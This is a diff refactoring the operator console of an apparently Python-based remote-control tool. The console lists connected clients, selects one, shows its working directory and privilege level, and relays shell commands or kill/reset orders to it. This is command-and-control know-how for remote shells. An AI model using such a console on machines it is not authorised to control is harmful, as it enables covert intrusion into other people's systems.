@@ -2,7 +2,6 @@ import subprocess
 import sys
 import threading
 
-from common.util import parse
 from server.config import SOCKET_ADDR
 from server.core import Server
 from server.util import *
@@ -15,96 +14,110 @@ def start_cli():
             command = colored_input('flc> ')
             if not command:
                 continue
+            name, arg = parse(command)
+            # 切换目录
+            if name == 'cd':
+                cd(arg)
             # 清屏
             elif command in ['cls', 'clear']:
                 subprocess.call(command, shell=True)
-            # 切换目录
-            elif command.split()[0] == 'cd':
-                cd(parse(command)[1])
-            # 退出服务端
+            # 退出
             elif command in ['quit', 'exit']:
                 server.socket.close()
                 sys.exit(0)
             # 查看客户端列表
             elif command in ['l', 'list']:
-                server.test_connections()
                 list_connections()
             # 连接到客户端
-            elif 'select' in command:
-                server.test_connections()
-                connection = None
-                try:
-                    connection = server.connections[int(command.replace('select', ''))]
-                except (ValueError, IndexError):
-                    print('[-] Not a valid selection')
-                if connection is not None:
-                    open_connection(connection)
+            elif name == 'select':
+                open_connection(get_target_connection(arg))
             # 快速连接到最近上线的客户端
             elif command == 'q':
-                server.test_connections()
-                connection = None
-                try:
-                    connection = server.connections[len(server.connections) - 1]
-                except IndexError:
-                    print('[-] No connection at this time')
-                if connection is not None:
-                    open_connection(connection)
+                open_connection(get_last_connection())
             else:
-                print('[-] Command not recognized')
+                try:
+                    open_connection(get_target_connection(command))
+                except:
+                    raise Exception('Command not recognized')
         except KeyboardInterrupt:
             print(colors.RESET)
             server.socket.close()
             sys.exit(0)
         except Exception as e:
-            print('[-] Error: {}'.format(e))
+            print(f'{colors.BRIGHT_RED}[-] {e}{colors.RESET}')
+        finally:
+            print()
 
 
 def list_connections():
+    server.test_connections()
     for i, connection in enumerate(server.connections):
         print('{} {}'.format(i, connection.info))
 
 
-def open_connection(connection):
-    connection.send_command('null', 'null')
-    cwd = connection.recv_result()[1]
-    print('[+] Connected to {}'.format(connection.address))
-    funcs = get_funcs()
-    user_type = get_user_type(connection.info['integrity'])
+def get_target_connection(idx):
+    server.test_connections()
+    try:
+        return server.connections[int(idx)]
+    except (ValueError, IndexError):
+        raise Exception('Not a valid selection')
+
+
+def get_last_connection():
+    server.test_connections()
+    try:
+        return server.connections[len(server.connections) - 1]
+    except IndexError:
+        raise Exception('No connection at this time')
+
+
+def open_connection(conn):
+    # 发送空命令
+    conn.send_command('null', 'null')
+    # 接收工作路径
+    wd = conn.recv_result()[1]
+    print('[+] Connected to {}'.format(conn.address))
+    # 服务端内置命令
+    internal_cmd = get_internal_cmd()
+    # 客户端用户权限
+    user_type = get_user_type(conn.info['integrity'])
     while True:
         try:
             command = colored_input(
-                f'{cwd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ' if user_type else f'{cwd}> ')
+                f'{wd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ' if user_type else f'{wd}> ')
             if not command:
                 continue
             name, arg = parse(command)
+            # 退出
             if command in ['quit', 'exit']:
                 break
-            elif command == 'kill':
-                connection.send_command(command)
+            # 关闭/重启客户端
+            elif command in ['kill', 'reset']:
+                conn.send_command(command)
                 break
             # 切换到最新的连接
             elif command == 'q':
-                server.test_connections()
-                conn = None
-                try:
-                    conn = server.connections[len(server.connections) - 1]
-                except IndexError:
-                    print('[-] No connection at this time')
-                if conn == connection:
+                connection = get_last_connection()
+                if connection == conn:
                     continue
-                if conn is not None:
-                    open_connection(conn)
+                open_connection(connection)
                 break
-            elif name in funcs:
-                if not funcs[name](arg, connection):
+            # 内置命令
+            elif name in internal_cmd:
+                if not internal_cmd[name](arg, conn):
                     continue
+            # 命令别名
+            elif name in AliasUtil.list():
+                send_alias(conn, command)
             else:
-                connection.send_command(command)
-            status, result = connection.recv_result()
+                conn.send_command(command)
+            # 接收结果
+            status, result = conn.recv_result()
             if not status:
                 result = colors.BRIGHT_RED + result + colors.RESET
             print(result)
-            cwd = connection.recv_result()[1]
+            # 接收工作路径
+            wd = conn.recv_result()[1]
         except ConnectionResetError:
             print('[-] Connection closed')
             break
